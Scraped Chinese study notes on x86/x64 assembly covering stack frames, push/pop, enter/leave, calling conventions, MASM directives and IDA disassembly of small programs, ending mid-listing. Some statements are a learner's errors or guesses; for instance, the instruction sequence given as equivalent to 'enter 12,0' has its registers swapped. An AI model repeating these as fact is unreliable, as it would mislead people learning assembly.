reg代表寄存器可以是8个通用寄存器中的任意一个 寻址公式三:[reg+立即数] 寻址公式四: [reg1+reg2*{1,2,4,8}] 寻址公式五:[reg1+reg2*{1,2,4,8}+立即数] 子函数调用栈stack栈结构1234567891011 SS:SP 数据 说明\t0019FF54 12345678 立即数-局部变量0019FF58 00403000 .data:aSsssssssss-局部变量0019FF5C 41530000 字符串3-局部变量0019FF60 41414141 字符串2-局部变量0019FF64 45414141 字符串1-局部变量------------------------------------在子函数分配栈空间之前0019FF68 0019FF84 Stack[00003F3C]:0019FF84\t|| EBP0019FF6C 00401009 start+9||IP0019FF70 0000000A 参数2-main变量0019FF74 00000064 参数1-main变量 一个main函数栈的使用 1234567891011121314151617这里就是子函数栈的部分[esp+0]在这之间的栈是用来传递参数的[esp+40]:40个字节的字符串[esp+80]:float的浮点数[esp+84]:float计算结果[esp+88]:计算的的字符串长度[esp+92]:字符串的大小然而C语言的函数声明,我还不知道他怎么分配栈空间的 float weight, volume; int size, letters; char name[40]; 栈数据的获取(不是非要去pop来获取)每次push一下 sp就会向上移动减少 如果你取栈数据 [sp]其实他会向下的方向获取一个type的数据 栈里的数据是取出时从低位到高位拿出 好比 12345push axmov bp,sppush cxpush dxmov bx,ss:[bp] 这样的话,你是可以获取数据ax的 这里的bp也给你记录了位置 但是我们通常不会去改变ebp的值 不要随性的push 与 pop你一定要记住,不要随性的push push的东西也是有讲究的 你要用它,你要临时保存它,你才会去push 否者的话,当你要用的时候,pop的东西,又不是你想要的 联合使用push与pop数据的传递 通常是 mov ax,ds:[si] mov es:[di],ax 我们也可以这样 push ax:[si] pop es:[di] 栈指令16位栈指针sp&#x2F;bp 32位指针esp&#x2F;ebp 64位rsp&#x2F;rbp push&#x2F;popesp指向了当前的数据, 如果再push 数据会放在esp的下一个 esp然后-4 不是说x86的sp一定是+或-4 当push 16位数据就sp-2 当push 32位数据就是sp-4 当push 立即数,默认就是sp-4 不能push 8位数据 12345678910xor eax,eax ;mov al,10;push almov ax,10push axmov eax,10push eaxpop eaxpop ax 一些异常 12push eaxpop ax push 进一个32位,esp-&#x3D;4 pop 出一个16位,esp+&#x3D;2 这导致堆栈不平衡 pushfd&#x2F;popfd可以对比一下8086的pushf与popf..然后就明白了 它到底push了啥???? EFL有些啥???? 0 0 1 高位左边 IF TF SF ZF 0 AF 0 PF 1 CF 低位右边 如何用专门的变量保存EFL以供使用? 12345.datarecive dd 0.code\tpushfd\tpop recive;得是一个32位的接收者 pushad&#x2F;popad&#x2F;pusha&#x2F;popa把所有寄存器入栈出栈 对于pusha&#x2F;popa是针对16位数据的寄存器 push什么? AX,CX,DX,BX,.SP,BP,SI,DI pop就是一个逆序 对于pushad是针对32位数据的寄存器 push&#x2F;pop同理 使用的注意事项,一个函数的返回值用一个寄存器来作为接收者,你用了pushad&#x2F;popad会把返回值给覆盖了,返回无效 leave我们之前会有一个 12345push ebpmov ebp,espsub esp,20....然后leave 首先我们要明确,函数栈的开辟我们不一定会把局部变量给全部使用完..所以esp要回到起点!也就是恢复到进来的时候! 12mov esp,ebppop ebp 进来push ebp,mov ebp,esp 出去 mov esp,ebp,pop ebp 进来,ebp要发生变化,esp要指向新的栈顶 出去,esp要恢复,ebp要还原 如果在x86的模式下,我们源码用ret 在IDA就会生成leave 如果源码写为 mov esp,epb pop ebp retn 就不会出现leave enter与leave相对应 enter出现在子函数的开头部分 enter有2个参数,都是立即数 参数一时开辟的字节数,得是4的倍数,有利于寻址 参数二,就写0,以后遇到再说吧 1enter 12,0 等价于 123push ebpmov esp,ebpsub ebp,12 关于enter与leave的应用 1234567891011121314151617181920212223242526272829;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .386 .model flat,stdcall option casemap:none;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;include Dqx.inc;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .data .data;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .codestart:\tcall\tmy\tinvoke\tExitProcess,NULL\tmy\tproc enter\t12,0 mov\tdword ptr [ebp-4],10 mov\tdword ptr [ebp-8],20 mov\tesp,ebp leave ret\tmy\tendp;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;\tend\tstart IDA 123456789101112fun proc nearvar_8= dword ptr -8var_4= dword ptr -4enter 0Ch, 0mov [ebp+var_4], 0Ahmov [ebp+var_8], 14hmov esp, ebpleaveretnfun endp 8086栈指令pushf&#x2F;popf就是对所有的flag寄存器给push一下或者pop一下 它会把8位的二进制寄存器合成2位的16进制然后出入栈 pusha&#x2F;popax86说16位可以pusha&#x2F;popa,但是我试了一下,好像不可以 栈维护用uses临时创建变量关于uses和[ebp+8] uses指令的顺序先于push ebp,mov ebp,esp 所以的话, 你的[ebp+8]就不再是传入的第一个参数 [ebp+8+N],N是你是你传入的那些参数,具体遇到再说 123456789101112131415161718192021222324;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .386 .model flat,stdcall option casemap:none;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;include Dqx.inc;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .data .data;--------------------------------------------------------;func proto\t:byte,:byte;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .codestart:\tcall\tfunc\tinvoke\tExitProcess,NULL;--------------------------------------------------------func PROC\tuses\teax ebx mov\teax,1 mov\tebx,2 retfunc ENDP;--------------------------------------------------------\tend\tstart 关于uses的变量内部入栈,他在内部平衡 123456789func proc nearpush eaxpush ebxmov eax, 1mov ebx, 2pop ebxpop eaxretnfunc endp 用local创建变量它的特点就是 栈空间的申请是内部add esp,负数 然后栈的平衡内部是mov esp,ebp,pop ebp 也就是一个leave就解决 12345678910111213141516171819202122232425262728;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .386 .model flat,stdcall option casemap:none;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;include Dqx.inc;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .data .dataarr1\tdb\t16 dup(&#x27;s&#x27;);--------------------------------------------------------;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .codestart: call\tfunc\tinvoke\tExitProcess,NULL;--------------------------------------------------------func\tproc\tlocal\tx[10]:byte\tlocal\ty:ptr byte\tmov\tbyte ptr x[9],6\tmov\tbyte ptr x[0],3\tmov\ty,offset arr1\tretfunc\tendp;--------------------------------------------------------\tend\tstart IDA 12345678910111213; Attributes: bp-based framefun proc nearpush ebpmov ebp, espadd esp, 0FFFFFFF0hmov byte ptr [ebp-1], 6mov byte ptr [ebp-10], 3mov dword ptr [ebp-16], offset aSsssssssssssss ; &quot;ssssssssssssssss&quot;leaveretnfun endp 可以看到,我创建了14字节 它给我分配了16字节 关于local建立的变量,他的本质是一个push,先push谁,取决于你先写谁 invoke 和调用约定都是实现push,然后call 参数的传递在子函数栈空间的下方 内部平衡就retn xx 外部平衡就add esp,xx 调用约定 参数压栈顺序 平衡堆栈 __cdecl 从右至左入栈 调用者清理栈 __stdcall 从右至左入栈 自身清理堆栈 __fastcall ECX&#x2F;EDX传送前两个剩下:从右至左入栈 自身清理堆栈 12345678910int __cdecl Plus(int a, int b) &#123; return a+b; &#125; push 2 push 1 call @ILT+15(Plus) (00401014) add esp,8 123456789101112132、int __stdcall Plus(int a, int b) &#123; return a+b; &#125; push 2 push 1 call @ILT+10(Plus) (0040100f) 函数内部： ret 8 12345678910111213141516171819202122232425262728293031 3、int __fastcall Plus(int a, int b) &#123; return a+b; &#125; mov edx,2 mov ecx,1 call @ILT+0(Plus) (00401005) 函数内部： ret 4、int __fastcall Plus4(int a, int b,int c,int d) &#123; return a+b+c+d; &#125; push 4 push 3 mov edx,2 mov ecx,1 call @ILT+5(Plus) (0040100a) 函数内部： ret 8 所以,如果根据ret 8是无法直接判断有几个参数 因为可能是fastcall 如果你直接看出了一个函数有几个参数, 那些参数也有可能不是当前call 也可能是内嵌call的 所以如何看一个函数用了多少个参数? (0).不用管是什么调用约定 (1). 看函数内部用了哪些对应的内存和寄存器 (2). 结合最后ret n的n 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;; 使用 nmake 或下列命令进行编译和链接:; ml /c /coff Hello.asm; Link /subsystem:windows Hello.obj;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .386 .model flat,stdcall option casemap:none;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;; Include 文件定义;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;include windows.incinclude kernel32.incincludelib\tkernel32.lib;对于上面的lib,inc还不是很理解;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;; 数据段.data;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;;c_var1 dd\t10;c_var2 dd\t20;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;; 代码段.code;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; sub1\tproto\tC,:DWORD,:DWORD sub2\tproto\tStdCall,:DWORD,:DWORD sub3\tproto\tsysCall,:DWORD,:DWORD sub4\tproto\tPASCAl,:DWORD,:DWORD sub5\tproto\tBASIC,:DWORD,:DWORD sub6\tproto\tfortran,:DWORD,:DWORD start: xor eax,eax invoke sub1,1,2 invoke sub2,1,2 invoke sub3,1,2 invoke sub4,1,2 invoke sub5,1,2 invoke sub6,1,2 push 0 call ExitProcess;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; sub1\tproc\tC,c_var1,c_var2 mov\teax,c_var1 mov\tebx,c_var2 ret sub1\tendp sub2\tproc\tStdCall,c_var1,c_var2 mov\teax,c_var1 mov\tebx,c_var2 ret sub2\tendp;在内部 retn 8,他们是在外部add esp,8 sub3\tproc\tsysCall,c_var1,c_var2 mov\teax,c_var1 mov\tebx,c_var2 ret sub3\tendp sub4\tproc\tPASCAl,c_var1,c_var2 mov\teax,c_var1 mov\tebx,c_var2 ret sub4\tendp sub5\tproc\tBASIC,c_var1,c_var2 mov\teax,c_var1 mov\tebx,c_var2 ret sub5\tendp sub6\tproc\tfortran,c_var1,c_var2 mov\teax,c_var1 mov\tebx,c_var2 ret sub6\tendp;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; end\tstart;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; x64栈对齐栈帧是一个过程 好比 12345push pbpmov rbp,rspmov rsp,rbppop rbp 为什么需要这2个东西 我们得知道一个函数栈的建立是不会触及栈底rbp的修改的,那为什么还要push rbp呢???? 这就是一个16字节的栈对齐了 一些函数的约定或者是个啥要求栈的地址必须是16的倍数 对于x64而言,push一下就是8字节 对于一个函数的调用 call一下8字节 push rbp 8字节 这几构成了16字节,达到了16字节对齐 还有一种栈对齐的方法 1and rsp , 0xfffffffffffffff0 ; 16 byte align the stack 堆栈图就代码 123456789101112131415161718192021222324PUSH EBPMOV EBP ,ESPSUB ESP,4B------这3个push是保护现场的PUSH EBXPUSH ESIPUSH EDI LEA EDI,DwoRD PTR SS: [EBP一40]mov Ecx,10mov EAx,ccccccCc ;之所以写0xCC,是为了防止缓冲区溢出,跑去0xcc那里执行REP Stos DwORD PTR ES:[EDI]----------------------------------------------上面的操作好比以炒菜前的准备MOV EAx,DwORD PTR SS: [ EBp+8 ]ADD EAx, DwoRD PTR SS:[EBP+C]----------------------------------------------下面的操作就像是炒菜后的刷锅PoP EDIPOP ESIPOP EBxMOV ESP,EBPPOP EBPretn 所以你把char给传递进去,其实是被扩展 1func(char x,char y) 所以传递1&#x2F;2个字节的参数都会被转化为4字节 为什么要扩展?因为效率的原因 1234char i 他会分配4个字节给ichar o[2] 他会分配4个字节char p[7] 他会分配8个字节 常用指令invoke它只是属于masm32的伪指令,不具有移植性 用法 invoke 函数名 参数1 参数2 参数3 &#x2F;&#x2F;参数的个数由函数确定 例如 1invoke\tMessageBox, NULL, offset A_Text, offset A_Title, MB_OK 假设是stdcall的调用方式 你在invoke写的正序 入栈的时候是逆序 invoke 不能用addr,只能offset,为什么???? 注意事项 如果你的参数是小于32位的寄存器eax&#x2F;edx,最后invoke会有一个扩展到32位,使得数据的丢失 如果数据重要,你就把他保存一下 还有一个东西巨坑,我们之前说过,我们不能push一个8位的数据,所以你不能传入一个字节的东西,除非强制类型转化 于是invoke是不能带有8位的参数的,否则就无法识别 addr取地址的操作 对于全局变量 addr会转化为offset 对于局部变量 addr会转化为lea指令 addr怎么用,我好不懂 见&lt;&lt;琢石成器&gt;&gt;.Page76 addr&#x3D;&#x3D;只能和invoke&#x3D;&#x3D;一起用 addr的参数只能是常熟,不能是变量????? proc &#x2F;endp 函数声明在8086里面,我们定义一个函数直接是标号就🆗 在x86下,我们是定义一个函数的是定义一个过程,称之为函数的声明 12函数的名字 proc [ 距离] [ 调用方式 ] [可视区域] [uses 寄存器列表] [参数名称:参数类型,参数名称:参数类型] [vararg] local 局部变量 请写明参数的类型,否则将无法识别,或者偷鸡摸狗耍小聪明 123456789main proc call func1 push 0 call j_ExitProcessmain endpfucn1 proc retfunc1 endp proto 函数声明类比C语言,它是一个函数的声明 用法 ,参考proc 好比 1MessageBox Proto :dword, :dword,:dword,:dword, 通常这样写是的等价的 1MessageBox Proto hwnd:dword, text:dword,title:dword,Type:dword, 使用例子 1234567sub2\tproto\tStdCall,:DWORD,:DWORDinvoke sub2,1,2sub2\tproc\tStdCall,c_var1:DWORD,c_var2:DWORDmov\teax,c_var1mov\tebx,c_var2retsub2\tendp;在内部 retn 8,他们是在外部add esp,8 作用1:外部声明 作用2:检查参数列表,proc与proto是否一致 extern 函数声明怎么用,遇到再说 inlcudelib 导入库8086的汇编,在调用中断时,我们只需要int一个编号就可以寻址 可能是因为中断不多,,,, 在win32-API中,类似的int很多,,,,我在这里称之为dll文件…根据不同的函数实现要求..我们的obj要选取不同的dll文件 此时就需要include来调用dll uses 伪指令,一个入栈的操作uses连接的东西是没有逗号的 123456789func_sum PROC uses ecx esi xor eax,eax\tsum_loop: add al,[esi] add esi,type arr1 loop sum_loop retfunc_sum ENDP 在IDA里面就是 123456789start_0 proc nearxor eax, eaxmov ecx, 10mov esi, offset unk_384000call sub_382051mov byte_38400A, alpush 0 ; uExitCodecall j_ExitProcessstart_0 endp 你可以把这个C代码翻译为汇编看看 12345678910111213141516#include &lt;stdio.h&gt;char str[10]=&quot;Dqx+Gh0st&quot;;void func(int);int main(void)&#123;\tint x2=4,y2=5,z2=6; char temp[10]=&quot;Dqx&quot;;\tputs(str); func(100);\treturn 0;&#125;void func(int w)&#123;\tint x3=1,y3=2,z3=3;\tprintf(&quot;%d %d %d&quot;,x3,y3,z3);&#125; IDA 1234567891011121314151617181920212223242526272829public _main_main proc nearpush ebpmov ebp, espand esp, 0FFFFFFF0hsub esp, 30hcall ___mainmov dword ptr [esp+44], 4mov dword ptr [esp+40], 5mov dword ptr [esp+36], 6//上面分别是你在main函数定义的变量mov dword ptr [esp+26], 787144h//这是你在main函数定义的字符串,你的字符串是10个字节,前3个字节被初始化了,也就是787144h//它用4字节的dword装下了你的3字节字符串//剩下了6字节,用了dword与word来初始化为0mov dword ptr [esp+30], 0mov word ptr [esp+34], 0mov dword ptr [esp], offset _str ; &quot;Dqx+Gh0st&quot;//对于全局变量他用offset取地址//mov dword ptr [esp], offset _str ; &quot;Dqx+Gh0st&quot;==push dword ptr [esp]call _putsmov dword ptr [esp], 64h ; &#x27;d&#x27; ; w/方式对[esp]操作的都==push xxxxcall _funcmov eax, 0leaveretn_main endp 进入子函数,前面已经传入参数了, 12345678910111213141516171819public _func_func proc nearpush ebpmov ebp, espsub esp, 28hmov dword ptr [ebp-12], 1mov dword ptr [ebp-16], 2mov eax, [ebp+8]mov [esp+12], eaxmov eax, [ebp-16]mov [esp+8], eaxmov eax, [ebp-12]mov [esp+4], eaxmov dword ptr [esp], offset Format ; &quot;%d %d %d&quot;call _printfleaveretn_func endp 123456//下级函数栈//EBP//IP//------------上级函数栈//参数1//参数2 所以的话,传入的参数都是通过ebp+8开始,是第一个参数 local 定义局部变量local创建的变量是不可传递的参数,只能在函数内部使用 另外局部变量不能和形式参数同名 local定义的类型在函数声明proc后,在程序执行CS:IP之前 local在win32模式下,默认数据的长度是32位的dd,如果主观的定义一个32位的的数据长度,我们是不需要指出数据长度的 local不支持和dup指令一起使用… local变量肯定不是在data区,它是在栈区 相比于proc的函数参数列表声明,它可以在invoke的时候传入参数的 现在有个问题,如果invoke只是一个call与push,那么我们是可以通过local来接受传递过来的参数的 也就是好比这个意思 1234int func(int x)&#123;\tint y=x;&#125; 于是局部变量y就接受了传递过来的参数 local 是enter与leave的高级版 用local会自动在最后使用leave指令,就不用你去手动的释放,最后再ret 123456func proc\tlocal arr[16]:byte\tlocal Num\t;local unk:WNDCLASS\txor eax,eax\t.... 然后利用local变量得到的数据不适用于一些指令 对于上面的代码在IDA的显示是 1234push ebpmov ebp, espadd esp, 0FFFFFFEChmov eax, [ebp+var_14] 0FFFFFFECh的绝对值是20,也就是16+4的长度 其实我们用sub esp,20会更加的形象 注意不可对局部变量取地址,我也不知道为什么 12345678func proc\tlocal arr[16]:byte\tlocal Num ;mov\tesi,offset arr\t;mov\tesi,lea arr\t;mov\tesi,arr\tmov eax,Num 上面被注释的指令都是不合法的!!!!!!!!! 1234567891011121314151617181920212223;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .386 .model flat,stdcall option 